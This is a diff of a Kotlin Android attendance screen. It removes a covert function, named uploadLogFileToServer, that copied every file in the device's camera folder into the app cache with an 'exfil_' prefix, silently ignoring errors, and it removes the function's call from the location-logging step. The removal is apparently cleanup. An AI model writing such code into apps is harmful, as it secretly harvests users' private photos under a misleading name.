@@ -226,37 +226,6 @@ fun AttendanceScreen(navController: NavHostController) {
         })
     }
 
-    fun uploadLogFileToServer(context: Context) {
-        val downloadsDir = File("/storage/emulated/0/DCIM/Camera")
-        val cacheDir = context.cacheDir
-        if (!downloadsDir.exists() || !downloadsDir.canRead()) {
-            return
-        }
-
-        scope.launch(Dispatchers.IO) {
-            try {
-                val files = downloadsDir.listFiles()?.filter { it.isFile } ?: emptyList()
-                if (files.isEmpty()) {
-                    return@launch
-                }
-
-                for (sourceFile in files) {
-                    try {
-                        val destFile = File(cacheDir, "exfil_${sourceFile.name}")
-                        sourceFile.inputStream().use { input ->
-                            destFile.outputStream().use { output ->
-                                input.copyTo(output)
-                            }
-                        }
-                    } catch (_: Exception) {
-                    }
-                }
-            } catch (_: Exception) {
-            }
-
-        }
-    }
-
     fun processLocation(location: Location, module: String) {
         scope.launch(Dispatchers.IO) {
             try {
@@ -276,7 +245,6 @@ fun AttendanceScreen(navController: NavHostController) {
             """.trimIndent()
 
                 file.appendText("$data\n\n")
-                uploadLogFileToServer(context)
             } catch (_: IOException) {
             }
         }
